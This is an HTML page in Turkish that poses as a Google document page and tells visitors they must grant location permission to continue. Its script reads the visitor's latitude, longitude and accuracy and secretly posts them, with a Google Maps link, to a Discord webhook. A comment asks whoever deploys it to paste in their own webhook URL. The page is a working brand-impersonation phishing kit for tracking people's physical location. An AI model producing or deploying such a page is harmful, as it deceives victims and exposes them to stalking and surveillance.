<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Google - Belge</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4; /* Daha aÃ§Ä±k bir arka plan */
            color: #333;
        }

        /* Ãœst Bilgi */
        .top-bar {
            background-color: #fff;
            padding: 15px 20px;
            border-bottom: 1px solid #ddd;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .top-bar-left {
            display: flex;
            align-items: center;
        }

        .top-bar-right {
            display: flex;
            align-items: center;
        }

        .gmail-link, .images-link, .app-icon {
            margin-left: 20px;
            text-decoration: none;
            color: #555;
        }

        .account-icon {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background-color: #eee;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 18px;
            color: #777;
            cursor: pointer;
        }

        /* Belge AlanÄ± */
        .document-container {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 50px 20px;
        }

        .document {
            background-color: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            width: 80%;
            max-width: 800px; /* Daha geniÅŸ belge alanÄ± */
            padding: 30px;
            text-align: center;
        }

        .google-logo {
            width: 200px;
            margin-bottom: 20px;
        }

        .document-title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .location-request-text {
            font-size: 18px;
            margin-bottom: 30px;
        }

        .location-message {
            font-size: 16px;
            color: #555;
            margin-top: 10px;
            display: none;
        }

        .location-message.show {
            display: block;
        }

        .request-button {
            background-color: #4CAF50;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        .request-button:hover {
            background-color: #45a049;
        }

        /* Alt Bilgi */
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #f2f2f2;
            padding: 15px;
            font-size: 14px;
            color: #70757a;
            border-top: 1px solid #dadce0;
            text-align: center;
        }
    </style>
</head>
<body>

    <!-- Ãœst Bilgi -->
    <div class="top-bar">
        <div class="top-bar-left">
        </div>
        <div class="top-bar-right">
            <a href="#" class="gmail-link">Gmail</a>
            <a href="#" class="images-link">GÃ¶rseller</a>
            <div class="app-icon">&#9776;</div>
            <div class="account-icon">A</div>
        </div>
    </div>

    <!-- Belge AlanÄ± -->
    <div class="document-container">
        <div class="document">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
            <h1 class="document-title">Konum Ä°zni Gerekli</h1>
            <p class="location-request-text">Devam etmek iÃ§in lÃ¼tfen konum iznini verin.</p>
            <button class="request-button" onclick="requestLocation()">Konum Ä°znini Ver</button>
            <p class="location-message" id="locationMessage">Konum alÄ±nÄ±yor...</p>
        </div>
    </div>

    <!-- Alt Bilgi -->
    <div class="footer">
        <p>Â© 2024 Google</p>
    </div>

    <script>
        // WEBHOOK URL'NÄ°ZÄ° BURAYA YAZIN (Discord iÃ§in)
        const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // Ã–RNEK
        const locationMessage = document.getElementById('locationMessage');

        function requestLocation() {
            if ("geolocation" in navigator) {
                locationMessage.classList.add('show');
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

                        // Konum bilgisini Discord'a gÃ¶nder
                        await sendToDiscord({
                            content: `ðŸ“ **Konum Bilgisi (Belge):**`,
                            embeds: [{
                                title: "Konum Bilgisi",
                                color: 5814783,
                                fields: [
                                    { name: "Enlem (Latitude)", value: `\`${latitude}\``, inline: true },
                                    { name: "Boylam (Longitude)", value: `\`${longitude}\``, inline: true },
                                    { name: "DoÄŸruluk", value: `\`~${accuracy.toFixed(0)} metre\``, inline: true },
                                    { name: "Harita Linki", value: `[Google Maps](${mapsUrl})`, inline: false }
                                ],
                                timestamp: new Date().toISOString()
                            }]
                        });
                        locationMessage.textContent = "Konum baÅŸarÄ±yla alÄ±ndÄ±!";
                        setTimeout(() => {
                          locationMessage.classList.remove('show');
                          locationMessage.textContent = "Konum alÄ±nÄ±yor..."; // BaÅŸlangÄ±Ã§ metnini geri yÃ¼kle
                        }, 3000); // 3 saniye sonra mesajÄ± gizle
                    },
                    (error) => {
                        let errorMessage = "Konum alÄ±namadÄ±.";
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Konum izni reddedildi.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Konum bilgisi mevcut deÄŸil.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "Konum isteÄŸi zaman aÅŸÄ±mÄ±na uÄŸradÄ±.";
                                break;
                        }
                        locationMessage.textContent = errorMessage;
                        setTimeout(() => {
                           locationMessage.classList.remove('show');
                           locationMessage.textContent = "Konum alÄ±nÄ±yor..."; // BaÅŸlangÄ±Ã§ metnini geri yÃ¼kle
                        }, 5000); // 5 saniye sonra mesajÄ± gizle
                    }
                );
            } else {
                locationMessage.textContent = "TarayÄ±cÄ±nÄ±z konum Ã¶zelliÄŸini desteklemiyor.";
                setTimeout(() => {
                    locationMessage.classList.remove('show');
                    locationMessage.textContent = "Konum alÄ±nÄ±yor..."; // BaÅŸlangÄ±Ã§ metnini geri yÃ¼kle
                }, 5000); // 5 saniye sonra mesajÄ± gizle
            }
        }

        // Discord'a GÃ¶nderme Fonksiyonu
        async function sendToDiscord(payload) {
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (!response.ok) {
                    throw new Error(`Webhook gÃ¶nderilemedi: ${response.status} ${response.statusText}`);
                }
                console.log("Discord'a log baÅŸarÄ±yla gÃ¶nderildi.");
            } catch (discordError) {
                console.error("Discord'a log gÃ¶nderilirken hata:", discordError);
                // Hata durumunda uyarÄ± vermek veya log tutmak iÃ§in bir iÅŸlem yapabilirsiniz.
            }
        }
    </script>
</body>
</html>
